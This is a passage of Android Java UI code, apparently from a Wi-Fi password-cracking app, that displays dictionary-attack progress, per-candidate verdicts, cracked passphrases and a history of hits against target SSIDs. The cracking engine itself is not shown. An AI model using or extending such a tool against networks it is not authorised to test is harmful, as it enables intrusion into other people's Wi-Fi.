            targetDictToggle.setText("目标派生: 已开启\n"
                    + L.s("按 SSID 与设备特征现场造候选，排在最前面尝试", "Generate candidates from the SSID and device traits, tried first"));
            targetDictToggle.setTextColor(OK_GREEN);
            targetDictToggle.setBackground(roundBg(AmberTheme.OK_BG, AmberTheme.RADIUS_CARD));
        } else {
            targetDictToggle.setText("目标派生: 已关闭\n"
                    + L.s("只用字典里已有的候选", "Use only candidates already in the dictionary"));
            targetDictToggle.setTextColor(TEXT_DIM);
            targetDictToggle.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        }
    }

    /** 破解页显示当前模式 */
    /**
     * 破解页那一行「通道 · 速度」。
     *
     * 只有一种通道（Root），所以不写「执行方式:」暗示可切换。
     *
     * 这一行不可点。可用性由上面的设置页实时检测负责，
     * 这里只报「用什么通道 + 实测多快」。
     */
    private void updateConnectMode() {
        // 破解页不再展示 Wi-Fi 开关状态（见 buildUi 里的说明）。
        if (connectModeView == null) return;
        // 用「每条约 X 秒」而不是「X 条/秒」。
        // 0.1 条/秒看着像「没在动」，换算成「每条约 10 秒」
        // 用户才知道该等多久 —— 后者才是他真正关心的信息。
        //
        // 数字来源分两种，必须说清楚是哪种：
        //   · 任务在跑 → **本次任务的实时实测值**（引擎的净尝试耗时 / 已试条数）
        //   · 没在跑   → 上一次的滚动平均，标注「上次」，不再冒充本次
        long live = 0;
        CrackService svc = liveService();
        if (svc != null) live = svc.currentRateMs();
        // 口径要写清楚（这是最近 20 条的实时节奏，不是整轮平均），但**不能写太长** ——
        // 这一行在真机上会被 ellipsize 截成「（近 20…」（2026-10-24 用户截图）。
        // 所以：短标签 + 短单位；同时允许折两行兜底（窄屏/大字号不会再被切掉）。
        if (live > 0) {
            connectModeView.setText(L.f("Root 通道 · %.1f 秒/条 · 近 20 条",
                    "Root channel · %.1fs/attempt · last 20",
                    live / 1000.0));
        } else {
            long ms = Prefs.avgMsPerItem(this);
            connectModeView.setText(L.f("Root 通道 · 上次 %.1f 秒/条",
                    "Root channel · %.1fs/attempt (last run)",
                    ms / 1000.0));
        }
        connectModeView.setTextColor(ACCENT);
    }

    /** 破解页显示当前选中的字典 */
    private void updateConnectDict() {
        if (connectDictView == null) return;
        if (usePlanMode) {
            io.github.wlmosv_png.wpaforge.audit.DictPlan lp = livePlan();
            if (lp != null && !lp.items.isEmpty()) {
                if (lp.state.isTerminal()) {
                    connectDictView.setText(L.s("多字典计划 · 已结束（点此清理或重选）",
                            "Plan · finished (tap to clear or re-pick)"));
                    connectDictView.setTextColor(AmberTheme.WARN);
                } else {
                    io.github.wlmosv_png.wpaforge.audit.DictPlan.Item cur = lp.current();
                    connectDictView.setText(L.f("多字典计划 · %d 本 · 当前「%s」",
                            "Plan · %d dictionaries · now \"%s\"",
                            lp.items.size(), cur == null ? "-" : cur.name));
                    connectDictView.setTextColor(ACCENT);
                }
                updateEmptyHint();
                return;
            }
        }
        int n = dictCount();
        if (n <= 0) {
            connectDictView.setText(L.s("未选择字典 —— 点这里选择",
                    "No dictionary — tap to select"));
            connectDictView.setTextColor(TEXT_DIM);
        } else {
            String name = (currentDictName == null || currentDictName.isEmpty())
                    ? L.s("字典", "Dictionary") : currentDictName;
            connectDictView.setText(name + "   ·   " + n + L.s(" 条", " entries"));
            connectDictView.setTextColor(OK_GREEN);
        }
        updateEmptyHint();
    }

    /**
     * 字典条数：优先用内存里的候选列表，其次用从权威恢复出来的显示值。
     * <p>这样「后台跑着 → 回前台」时，即使候选列表还在后台读盘，
     * 界面上也不会显示成「未选择字典」。
     */
    private int dictCount() {
        if (currentDict != null && !currentDict.isEmpty()) return currentDict.size();
        return Math.max(0, dictSizeShown);
    }

    /** 服务状态回调 */
    private final CrackService.UiCallback svcCallback = new CrackService.UiCallback() {
        @Override
        public void onQueueChanged(java.util.List<TaskQueue.Task> queue) {
            ui.post(() -> {
                queueCache.clear();
                queueCache.addAll(queue);
                renderQueue();
                renderProgressCardState();   // 同上：队列变了就重画状态行
                // 队列是持久化权威：界面被重建后靠它把「目标/字典」的显示补回来
                restoreSelectionFromAuthority();
                // 接力切换字典时，队列变了、计划 index 也变了 —— 必须同步刷新
                // 「当前字典」卡与「计划/第几本」行，否则 A 切 B 后还显示 A。
                updateDictStatus();
                updateConnectDict();
                refreshPlanLine();
                // 下一本**真正接管**（出现新的 RUNNING 任务）后，收掉上一本的结算卡：
                // 否则「正在准备下一本」会一直挂着，与新字典的运行状态打架。
                if (!resultCardTaskId.isEmpty()) {
                    for (TaskQueue.Task t : queueCache) {
                        if (t.state == TaskQueue.State.RUNNING && !t.id.equals(resultCardTaskId)) {
                            hideResultCard();
                            resultCardTaskId = "";
                            break;
                        }
                    }
                }
            });
        }

        @Override
        public void onAttempt(int index, int total, String candidate) {
            // 只更新「当前候选」那一行文字。
            //
            // 进度条本身**不在这里画** —— onAttempt 用的 index 与
            // onProgress 用的 tested 是两套计数，交替刷新会让进度条来回跳。
            // 统一由 onProgress 负责，这里只报当前在试什么。
            ui.post(() -> {
                curCandIndex = index;
                // 总条数在第一条候选开始时就已经确定（服务传进来的 total），
                // 这里只是把它显示出来 —— 不额外查询、不重新统计。
                if (statTotalView != null && total > 0) {
                    statTotalView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(total));
                }
                renderProgressCardState();
                // 方案 A：候选不再塞在进度条脚下的小字里，
                // 而是独立的「正在试」区（等宽大字 + 上两条）。
                candTicker.push(candidate);
                renderCandidates();
                if (connectProgress != null) {
                    connectProgress.setVisibility(View.VISIBLE);
                    // 首帧也得给个形：stages 为空时 onMeasure 只给 dp(20)，
                    // 轨道画不全（表现为「第一条候选没有进度条」）。
                    float p = total > 0 ? (float) (index - 1) / total : 0f;
                    java.util.List<io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage> s0 =
                            new java.util.ArrayList<>();
                    s0.add(new io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage(
                            p, io.github.wlmosv_png.wpaforge.ui.CrackHud
                                    .percentLabel(index - 1, total)));
                    connectProgress.setStages(s0);
                    connectProgress.setDone(false);
                    // **不要在这里 setText** —— 进度文字只归 onProgress 管。
                    // 我先前的版本在这里写了一次空标题，结果 onProgress 刚写上的
                    // 「还剩多久」在下一条候选开始时又被清掉，界面上大部分时间空着
                    // （2026-10-24 实机反馈「大字不显示」）。
                }
            });
        }

        @Override
        public void onAttemptResult(String candidate, boolean hit, long ms, String detail) {
            // 兼容入口：没有 Verdict 时按「不确定」展示，绝不冒充「密码错误」。
            onAttemptResult(candidate, hit, ms, detail, null);
        }

        /**
         * 带 Verdict 的展示入口（U1）。
         *
         * <p><b>关键改动</b>：非成功不再一律打 ✗。旧代码的 {@code else} 分支
         * 把 AUTH_FAIL / NETWORK_AUTH_FAIL / TIMEOUT / INCOMPLETE /
         * TERMINATED_UNKNOWN / ERROR 全部显示成同一个 ✗ —— 用户会认为
         * 「这批密码都错了」，而其中三种其实「可能马上就成功」或「与密码无关」。
         *
         * <p>现在符号、标签、说明、颜色全部来自
         * {@link io.github.wlmosv_png.wpaforge.ui.VerdictView} 这一处定义，
         * 页面不再自行解释 Verdict。
         */
        @Override
        public void onAttemptResult(String candidate, boolean hit, long ms, String detail,
                                    io.github.wlmosv_png.wpaforge.audit.CrackEngine.Verdict v) {
            ui.post(() -> {
                String pw = io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(curCandIndex, candidate);
                if (hit) {
                    appendStreamColored(io.github.wlmosv_png.wpaforge.ui.VerdictView.symbol(v)
                            + " 成功  " + pw + "  (" + ms + "ms " + detail + ")", OK_GREEN);
                    showHitCard(candidate, ms, detail);
                } else if (v != null) {
                    String sym = io.github.wlmosv_png.wpaforge.ui.VerdictView.symbol(v);
                    String lbl = io.github.wlmosv_png.wpaforge.ui.VerdictView.label(v);
                    // 网络级/通道级用告警色；候选级失败用危险色；其余用暗色
                    int color = io.github.wlmosv_png.wpaforge.ui.VerdictView
                            .countsAsProvenWrong(v) ? DANGER
                            : io.github.wlmosv_png.wpaforge.ui.VerdictView
                                    .needsAttention(v) ? ACCENT : TEXT_DIM;
                    // P1b：同结论连续出现时合并为一行并标 ×N，而不是刷几十行。
                    // 合并键用 **Verdict 本身**：它是裁决层的唯一结论标识，
                    // 与 UI 同源（不在这里二次推断）。具体判据来源在 detail 里
                    // 逐条保留，文件日志也逐条落盘 —— 合并只影响视觉密度。
                    String key = v.name();
                    /*
                     * 两层文本（2026-11-02 收口）。
                     *
                     * 普通视图给人看：结论 + **第几条** + 秒数。
                     *   · 不再出现 `#130548(len=9)` 这种哈希串 —— 那是技术标识，
                     *     普通用户既读不懂也记不住，只觉得软件很乱。
                     *   · 耗时用秒（0.1s）而不是毫秒（123ms），人脑对秒更有直觉。
                     *
                     * 技术视图给排查用：保留 attemptId、候选哈希与归属来源，
                     * 切到「全部」就能看到，**原始证据一条没少**。
                     */
                    String plainLine = sym + "  " + lbl
                            + "  ·  " + L.s("第 " + curCandIndex + " 条", "#" + curCandIndex)
                            + "  ·  " + fmtSeconds(ms);
                    String techLine = sym + "  " + lbl + "  " + pw
                            + "  (" + ms + "ms" + (detail == null || detail.isEmpty()
                                    ? "" : " " + detail) + ")";
                    appendStreamDedup(plainLine, color, key, techLine);
                    String why = io.github.wlmosv_png.wpaforge.ui.VerdictView.description(v);
                    if (why != null && !why.isEmpty() && !key.equals(lastWhyKey)) {
                        lastWhyKey = key;
                        appendStreamDetail("     " + why, TEXT_DIM);
                    }
                } else {
                    // 没有 Verdict（旧路径）：保持中性，不冒充失败
                    appendStreamDetail("·  "
                            + pw + "  (" + ms + "ms " + detail + ")", TEXT_DIM);
                }
                // 每条都刷新状态行的实时速率 —— 否则用户看到的一直是上一个任务的数字
                updateConnectMode();
            });
        }

        /**
         * 实时结论分布（UI 第二轮）。
         *
         * <p>三个数都来自**引擎的唯一统计入口**（{@code VerdictTally}），
         * 界面不重新推断任何一条：
         * <ul>
         *   <li>已证实错误 → 危险色（这条密码被证明了是错的）</li>
         *   <li>未确定 → 告警色（我们没拿到证据，下次还会重试）</li>
         * </ul>
         * 网络级失败已包含在「未确定」里（口径见 CrackEngine.inconclusiveCount），
         * 这里不再单独加一列，避免把「环境问题」摆成第五种结论。
         */
        @Override
        public void onTally(int confirmed, int inconclusive, int networkAuthFail) {
            ui.post(() -> {
                if (statWrongView != null) {
                    statWrongView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(confirmed));
                    statWrongView.setTextColor(confirmed > 0 ? DANGER : AmberTheme.TEXT_FAINT);
                }
                if (statUnkView != null) {
                    statUnkView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(inconclusive));
                    statUnkView.setTextColor(inconclusive > 0 ? ACCENT : AmberTheme.TEXT_FAINT);
                }
                lastTallyConfirmed = confirmed;
                lastTallyInconclusive = inconclusive;
                lastTallyNetAuthFail = networkAuthFail;
                refreshPlanLine();
            });
        }

        @Override
        public void onProgress(int tested, int total, double rate, long etaMs) {
            ui.post(() -> {
                lastTested = tested;
                lastTotal = total;
                if (connectProgress == null) return;
                connectProgress.setVisibility(View.VISIBLE);
                float outer = total > 0 ? (float) tested / total : 0f;
                // 方案 A：进度只留一条轨道（原来三条轨道把同一件事说了三遍），
                // 主视觉是「剩多久」，副标题是「已试多少 · 多快」。
                java.util.List<io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage> st =
                        new java.util.ArrayList<>();
                st.add(new io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage(
                        outer, io.github.wlmosv_png.wpaforge.ui.CrackHud.percentLabel(tested, total)));
                connectProgress.setStages(st);
                connectProgress.setDone(false);
                /* 进度条上只留「还剩多久」这一行大字；脚注不再重复写。
                 * 上一版条里写「56 / 60 · 17 条/分」，卡片下面又写一遍
                 * 「17 条/分 … 剩 13 秒」——同一屏两组一模一样的数字。 */
                connectProgress.setText(
                        io.github.wlmosv_png.wpaforge.ui.CrackHud.etaLabel(etaMs),
                        "");

                // Obsidian Amber：同一组数字再喂给「大数字区」。
                // **不重新计算任何东西** —— tested/total/rate/etaMs 全部是服务
                // 在这次回调里传进来的原始值，格式化仍走既有的 CrackHud。
                // 速率/剩余拿不到时显示「待测/待估」，不编一个数字出来。
                if (statDoneView != null) {
                    statDoneView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(tested));
                    statDoneView.setTextColor(TEXT);
                }
                if (statTotalView != null) {
                    statTotalView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(total));
                    statTotalView.setTextColor(TEXT);
                }
                if (statPctView != null) {
                    boolean known = total > 0;
                    statPctView.setText(known
                            ? io.github.wlmosv_png.wpaforge.ui.CrackHud
                                    .percentLabel(tested, total)
                            : "—");
                    statPctView.setTextColor(known ? ACCENT : AmberTheme.TEXT_FAINT);
                }
                if (statRateView != null) {
                    String rl = io.github.wlmosv_png.wpaforge.ui.CrackHud.ratePerMin(rate);
                    statRateView.setText(rl.isEmpty()
                            ? L.s("速率 待测", "rate —") : rl);
                }
                if (statEtaView != null) {
                    // 运行期间「剩多久」只由进度条上那行大字承担，这里留空避免重复
                    statEtaView.setText("");
                }
                // 候选跑完了但还没收到"结束"回调 → 收尾中（恢复临时网络配置等）
                boolean nowFinishing = total > 0 && tested >= total;
                if (nowFinishing && !finishingNow) {
                    // 第一次进入收尾：把进度条收掉。
                    // 它已经没有信息可给（100% 了），留着只会继续放流动效 ——
                    // 那正是用户说的"跑完了进度条还在动，像卡住"。
                    finishingStartedAt = System.currentTimeMillis();
                    if (connectProgress != null) {
                        connectProgress.setDone(false);
                        connectProgress.setVisibility(View.GONE);
                    }
                    ui.removeCallbacks(finishingTick);
                    ui.post(finishingTick);
                }
                finishingNow = nowFinishing;
                renderProgressCardState();
            });
        }

        @Override
        public void onTaskDone(TaskQueue.Task task, String hitPassword, String outcome) {
            /* 这个回调是**服务的工作线程**（wpaforge-crack）调进来的，
             * 所以这里**一个字都不许碰 View**。
             *
             * <p>线上抓到的第二次崩溃就是这个：
             * {@code CalledFromWrongThreadException: Expected main, Calling wpaforge-crack}
             * —— 我把 finishNote.setVisibility / showResultCard 写在了 ui.post 外面。
             * 所有界面动作一律进 ui.post，没有例外。 */
            ui.post(() -> {
                finishingNow = false;
                ui.removeCallbacks(finishingTick);
                if (finishNote != null) finishNote.setVisibility(View.GONE);
                /* 界面代码抛异常**不能**把状态机留在"收尾中"：
                 * 上一轮就是 showResultCard 里 NPE → 后面的
                 * renderProgressCardState 没执行 → 界面永远停在收尾中。 */
                try {
                    showResultCard(task, outcome);
                } catch (Throwable t) {
                    appendStreamColored(L.s("结算卡显示失败（不影响破解结果）: ",
                            "result card failed (result unaffected): ") + t, DANGER);
                }
                // 只用于显示：把服务报回来的真实结论记下来给进度卡的状态行用。
                // 这里**不判定**成功/失败，只是把 outcome 换个说法展示。
                lastOutcomeLabel = "DONE_HIT".equals(outcome)
                        ? L.s("已命中", "Hit")
                        : "PAUSED".equals(outcome)
                            ? L.s("已暂停 · 进度已保留", "Paused · progress kept")
                            : "STOPPED".equals(outcome)
                                ? L.s("已停止", "Stopped")
                                : L.s("已结束 · 未命中", "Finished · no match");
                lastOutcomeColor = "DONE_HIT".equals(outcome) ? OK_GREEN
                        : "STOPPED".equals(outcome) ? DANGER : io.github.wlmosv_png
                                .wpaforge.ui.AmberTheme.TEXT_DIM;
                // P3 修复：**任务结束时必须把「正在尝试」标签改掉**。
                //
                // 旧实现只在 startConnect() 里把标签设成「正在尝试」，结束后
                // 再没有任何地方改它 —— 于是命中后界面仍显示「正在尝试 <密码>」，
                // 与同一屏的「已命中」并存（真机 2026-11-02 亲眼所见）。
                // 这里按 outcome 换成陈述语态，并且**不冒充成功**：
                // 命中就说「已命中」，其余一律「最后尝试」（试过，不代表成功）。
                if (candLabel != null) {
                    candLabel.setText("DONE_HIT".equals(outcome)
                            ? L.s("已命中 · 该候选", "MATCHED · this candidate")
                            : L.s("最后尝试", "LAST TRIED"));
                    candLabel.setTextColor("DONE_HIT".equals(outcome)
                            ? OK_GREEN : io.github.wlmosv_png.wpaforge.ui.AmberTheme.TEXT_DIM);
                }
                histSummary = null;      // 有新记录，让统计缓存失效
                if ("DONE_HIT".equals(outcome)) {
                    appendStreamColored(L.s("⚡ 密钥命中 ", "★ HIT!") + task.ssid + " = "
                            + io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(curCandIndex, hitPassword),
                            OK_GREEN);
                    Toast.makeText(MainActivity.this,
                            L.s("破解成功: ", "Cracked: ") + task.ssid, Toast.LENGTH_LONG).show();
                    // 记一笔历史
                    HistStore.append(MainActivity.this, new HistStore.Record(
                            System.currentTimeMillis(), task.ssid, task.bssid,
                            task.dictName, task.dictSize, task.testedThisRun,
                            task.elapsedMs, true, hitPassword));
                } else if ("PAUSED".equals(outcome)) {
                    appendStreamColored(L.s("已挂起（现场 ", "Paused (progress ") + task.offset + "/" + task.dictSize
                            + L.s("，可继续）", ", resumable)"), ACCENT);
                    // 暂停也不能让用户断网等着 —— 之前只有「中止」才恢复
                    restoreWifiAfterRun();
                } else if ("STOPPED".equals(outcome)) {
                    appendStreamColored(L.s("已中止（现场 ", "Stopped (progress ") + task.offset + "/" + task.dictSize + "）", DANGER);
                    restoreWifiAfterRun();
                } else {
                    appendStream(L.s("任务结束: ", "Task finished: ") + task.ssid + " 未命中");
                    restoreWifiAfterRun();
                    HistStore.append(MainActivity.this, new HistStore.Record(
                            System.currentTimeMillis(), task.ssid, task.bssid,
                            task.dictName, task.dictSize, task.testedThisRun,
                            task.elapsedMs, false, null));
                }
                // 进度条收尾：命中整条变绿，停止清空
                if (connectProgress != null) {
                    if ("DONE_HIT".equals(outcome)) {
                        java.util.List<io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage> fs =
                                new java.util.ArrayList<>();
                        for (int i = 0; i < 3; i++) {
                            fs.add(new io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage(1f, ""));
                        }
                        connectProgress.setStages(fs);
                        connectProgress.setDone(true);
                        connectProgress.setText(
                                L.s("★ 命中", "★ HIT"),
                                task.ssid + " = " + (hitPassword == null ? "" : hitPassword));
                    } else if ("STOPPED".equals(outcome)) {
                        connectProgress.setDone(false);
                        connectProgress.setStages(new java.util.ArrayList<>());
                        connectProgress.setText(
                                L.s("已停止", "Stopped"), "");
                        connectProgress.setVisibility(View.GONE);
                        // 停止后「剩余」不再有意义；已完成/总数/完成度保留真实值
                        if (statEtaView != null) statEtaView.setText(L.s("剩余 已中止", "ETA —"));
                        if (statRateView != null) statRateView.setText(L.s("速率 已中止", "rate —"));
                    } else {
                        /* 未命中（及其它终态）：**把进度条收掉**。
                         * 旧版这里没有分支 → 跑完仍停在"100% + 流光动画 + 运行中"，
                         * 用户盯着它等一个永远不会来的结果，然后觉得是垃圾。
                         * 结论交给结算卡说，进度条没必要留在屏幕上继续转。 */
                        connectProgress.setDone(false);
                        connectProgress.setStages(new java.util.ArrayList<>());
                        connectProgress.setText("", "");
                        connectProgress.setVisibility(View.GONE);
                        if (statEtaView != null) statEtaView.setText(L.s("剩余 —", "ETA —"));
                        if (statRateView != null) {
                            statRateView.setText(L.s("速率 已结束", "rate —"));
                        }
                    }
                }
                renderProgressCardState();
                refreshQueue();
            });
        }

        @Override
        public void onLog(String line) {
            ui.post(() -> appendStream(line));
        }

        @Override
        public void onRestoreDone(String summary) {
            ui.post(() -> lastRestoreSummary = summary == null ? "" : summary);
        }
    };

    /** 破解页的候选流日志。切页签会重建界面，所以文本要留在字段里。 */
    /**
     * 日志缓冲。用 SpannableStringBuilder 而不是 StringBuilder ——
     * 每行要带自己的颜色，不能靠 TextView.setTextColor 统一着色
     * （那样最后一行的颜色会覆盖整个日志区，历史行颜色全被抹掉）。
     */
    private final android.text.SpannableStringBuilder streamBuffer =
            new android.text.SpannableStringBuilder();

    /** 渲染队列。会保留主滚动位置，避免列表更新后页面乱跳。 */
    private void renderQueue() {
        if (queueBox == null) return;
        final int keepY = mainScroll != null ? mainScroll.getScrollY() : 0;
        queueBox.removeAllViews();

        if (queueCache.isEmpty()) {
            // 没任务时不占位置 —— 空的时候放一块提示反而乱
            //
            // 同时把顶部进度条一并收起来。
            // 否则用户把任务全删了，那三根条还挂在那里，
            // 看起来像还在跑 **且进度不动** —— 很像死机。
            if (connectProgress != null) {
                connectProgress.setDone(false);
                connectProgress.setStages(new java.util.ArrayList<>());
                connectProgress.setText("", "");
                connectProgress.setVisibility(View.GONE);
            }
            syncButtons();
            restoreScroll(keepY);
            return;
        }

        // 任务多于 1 个才显示汇总条
        if (queueCache.size() > 1) {
            queueBox.addView(summaryBar());
        }
        for (TaskQueue.Task task : queueCache) {
            queueBox.addView(taskCard(task));
        }
        syncButtons();
        restoreScroll(keepY);
    }

    /**
     * 恢复主滚动位置。
     *
     * 必须 clamp 到内容实际高度内 —— 队列变短后旧位置可能超出，
     * 会出现整页空白（看起来像"什么都没了"）。
     */
    private void restoreScroll(int y) {
        if (mainScroll == null || y <= 0) return;
        mainScroll.post(() -> {
            if (mainScroll.getChildCount() == 0) return;
            int contentH = mainScroll.getChildAt(0).getHeight();
            int viewH = mainScroll.getHeight();
            int max = Math.max(0, contentH - viewH);
            mainScroll.scrollTo(0, Math.min(y, max));
        });
    }

    /** 队列汇总条（只在多任务时出现） */
    private View summaryBar() {
        int running = 0, paused = 0, pending = 0, done = 0;
        for (TaskQueue.Task t : queueCache) {
            switch (t.state) {
                case RUNNING: running++; break;
                case PAUSED: paused++; break;
                case PENDING: pending++; break;
                default: done++; break;
            }
        }
        StringBuilder sb = new StringBuilder();
        if (running > 0) sb.append("● ").append(running).append("   ");
        if (paused > 0) sb.append("‖ ").append(paused).append("   ");
        if (pending > 0) sb.append("○ ").append(pending).append("   ");
        if (done > 0) sb.append("✓ ").append(done);

        TextView t = new TextView(this);
        t.setText(sb.toString().trim());
        t.setTextSize(AmberTheme.FS_BODY);
        t.setTextColor(running > 0 ? OK_GREEN : (paused > 0 ? AMBER : TEXT_DIM));
        t.setBackground(roundBgStroked(AmberTheme.CARD_2, AmberTheme.EDGE, AmberTheme.RADIUS_CHIP, 0.8f));
        t.setPadding(px(14), px(10), px(14), px(10));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = px(8);
        t.setLayoutParams(lp);
        return t;
    }

    /** 文件名里不允许出现的字符（SSID 可能带这些） */
    private static final String FNAME_BAD = "[\\\\/:*?\"<>|]";
    private static final int AMBER = AmberTheme.ACCENT;
    private static final int PAUSE_BG = AmberTheme.WARN_BG;

    /** 单个任务卡片 */
    private View taskCard(TaskQueue.Task task) {
        // 暂停 / 进行中用不同底色，一眼能分辨
        int cardBg = SURFACE;
        if (task.state == TaskQueue.State.PAUSED) cardBg = PAUSE_BG;
        else if (task.state == TaskQueue.State.RUNNING) cardBg = AmberTheme.OK_BG;

        LinearLayout item = new LinearLayout(this);
        item.setOrientation(LinearLayout.VERTICAL);
        item.setBackground(roundBg(cardBg, AmberTheme.RADIUS_CARD));
        item.setPadding(px(16), px(15), px(16), px(15));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = px(9);
        item.setLayoutParams(lp);

        // 第一行：SSID + 状态徽章
        LinearLayout head = new LinearLayout(this);
        head.setOrientation(LinearLayout.HORIZONTAL);
        head.setGravity(Gravity.CENTER_VERTICAL);

        TextView title = new TextView(this);
        title.setText(task.ssid);
        title.setTextSize(AmberTheme.FS_STATE);
        title.setTextColor(TEXT);
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        title.setSingleLine(true);
        title.setEllipsize(TextUtils.TruncateAt.END);
        head.addView(title, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        TextView badge = new TextView(this);
        badge.setText(badgeText(task.state));
        badge.setTextSize(AmberTheme.FS_SMALL);
        badge.setTextColor(badgeFgFor(task));
        badge.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        badge.setBackground(roundBg(badgeBgFor(task), AmberTheme.RADIUS_CHIP));
        badge.setPadding(px(10), px(4), px(10), px(4));
        head.addView(badge);

        item.addView(head);

        // 第二行：BSSID 与信号
        TextView sub = new TextView(this);
        sub.setText(task.bssid + "   " + task.rssi + "dBm");
        sub.setTextSize(AmberTheme.FS_LABEL);
        sub.setTextColor(TEXT_DIM);
        sub.setPadding(0, px(5), 0, 0);
        item.addView(sub);

        // 第三行：字典 + 进度
        TextView meta = new TextView(this);
        String hit = task.hitPassword == null || task.hitPassword.isEmpty()
                ? "" : L.f("\n口令: %s", "\nPassphrase: %s", task.hitPassword);
        String modeTag = L.s("Root", "Root");
        meta.setText(L.f("%s 模式\n字典 %s（%s）\n进度 %d / %d%s%s%s",
                "%s mode\nDictionary %s (%s)\nProgress %d / %d%s%s%s",
                modeTag,
                task.dictName,
                io.github.wlmosv_png.wpaforge.audit.DictRule.formatCount(task.dictSize),
                task.offset, task.dictSize,
                task.testedThisRun > 0
                    ? L.f("   本轮试了 %d 条", "   %d tried this run", task.testedThisRun) : "",
                hit,
                missCaveat(task)));
        meta.setTextSize(AmberTheme.FS_SMALL);
        meta.setTextColor(TaskQueue.State.DONE_HIT == task.state ? OK_GREEN : TEXT_DIM);
        meta.setLineSpacing(px(4), 1f);
        meta.setPadding(0, px(8), 0, 0);
        item.addView(meta);

        // 进度条（细线）
        if (task.dictSize > 0) {
            View bar = new View(this);
            android.graphics.drawable.GradientDrawable g =
                    new android.graphics.drawable.GradientDrawable();
            g.setColor(TEXT_DIM);
            g.setCornerRadius(px(2));
            android.graphics.drawable.LayerDrawable ld =
                    new android.graphics.drawable.LayerDrawable(new android.graphics.drawable.Drawable[]{
                            trackDrawable(), progressDrawable(task)});
            bar.setBackground(ld);
            LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, px(3));
            blp.topMargin = px(10);
            item.addView(bar, blp);
        }

        // 暂停时给一句明确提示
        if (task.state == TaskQueue.State.PAUSED) {
            TextView tip = new TextView(this);
            tip.setText(L.f("已暂停在 %d / %d，点「继续」从这里接着跑",
                    "Paused at %d / %d — tap Resume to continue from here",
                    task.offset, task.dictSize));
            tip.setTextSize(AmberTheme.FS_SMALL);
            tip.setTextColor(AMBER);
            tip.setPadding(0, px(10), 0, 0);
            item.addView(tip);
        }

        // 操作行
        LinearLayout ops = new LinearLayout(this);
        ops.setOrientation(LinearLayout.HORIZONTAL);
        ops.setPadding(0, px(12), 0, 0);

        switch (task.state) {
            case PAUSED:
                ops.addView(smallChip(L.s("▶ 继续", "▶ Resume"), OK_GREEN, v -> resumeTask(task)));
                break;
            case RUNNING:
                ops.addView(smallChip(L.s("‖ 暂停", "‖ Pause"), AMBER, v -> {
                    if (crackService != null) crackService.pause();
                    appendStreamColored(L.s("正在暂停…（进度会保留）", "Pausing… (progress kept)"), ACCENT);
                }));
                break;
            case PENDING:
                ops.addView(smallChip(L.s("▶ 开始", "▶ Start"), OK_GREEN, v ->
                        CrackService.start(MainActivity.this)));
                break;
            default:
                break;
        }
        ops.addView(smallChip(L.s("移除", "Remove"), DANGER, v -> {
            TaskQueue.remove(this, task.id);
            refreshQueue();
        }));
        item.addView(ops);

        return item;
    }

    private android.graphics.drawable.Drawable trackDrawable() {
        android.graphics.drawable.GradientDrawable g =
                new android.graphics.drawable.GradientDrawable();
        g.setColor(AmberTheme.NEUTRAL_BG);
        g.setCornerRadius(px(2));
        return g;
    }

    /** 已经跑过的那一段 */
    private android.graphics.drawable.Drawable progressDrawable(TaskQueue.Task task) {
        android.graphics.drawable.GradientDrawable g = new android.graphics.drawable.GradientDrawable();
        g.setColor(task.state == TaskQueue.State.DONE_HIT ? OK_GREEN
                : task.state == TaskQueue.State.PAUSED ? AMBER : ACCENT);
        g.setCornerRadius(px(2));
        float p = task.progress();
        g.setBounds(0, 0, (int) (getResources().getDisplayMetrics().widthPixels * p
                - px(64)), px(3));
        return g;
    }

    /**
     * 刷新「计划 / 本次跳过」那一行。
     *
     * <p>数据来自 {@code CrackService} 的只读静态快照（条数 + 一行摘要），
     * 不含候选、口令或任何内部标识。两项都为空时整行隐藏 ——
     * 单字典、无历史时不该多出一行噪音。
     */
    private void refreshPlanLine() {
        if (planLineView == null) return;
        String plan = CrackService.planSummary();
        int sc = CrackService.lastSkippedConfirmed();
        int su = CrackService.lastSkippedUndetermined();
        StringBuilder sb = new StringBuilder();
        if (plan != null && !plan.isEmpty()) sb.append(plan);
        // 透明化（第七节）：当前目标 / 模式 / 过滤档位 / 待执行条数。
        {
            String mode = usePlanMode ? L.s("计划", "Plan") : L.s("单字典", "Single");
            String pol = CrackService.lastSkipPolicyId() == 1
                    ? L.s("省时", "save-time") : L.s("保守", "conservative");
            int work = CrackService.lastWorkTotal();
            if (work > 0 || sc + su > 0) {
                if (sb.length() > 0) sb.append("\n");
                sb.append(L.s("目标 ", "Target ")).append(currentTargetKey().isEmpty()
                                ? L.s("(未选)", "(none)") : Prefs.targetLabel(this))
                        .append(L.s(" · 模式 ", " · mode ")).append(mode)
                        .append(L.s(" · 过滤 ", " · filter ")).append(pol);
                if (work > 0) {
                    sb.append(L.s(" · 本次待执行 ", " · to run ")).append(work);
                }
            }
        }
        // 计划模式下补一行「第几本 / 当前 / 下一本 / 整体进度」，数据来自服务端活计划。
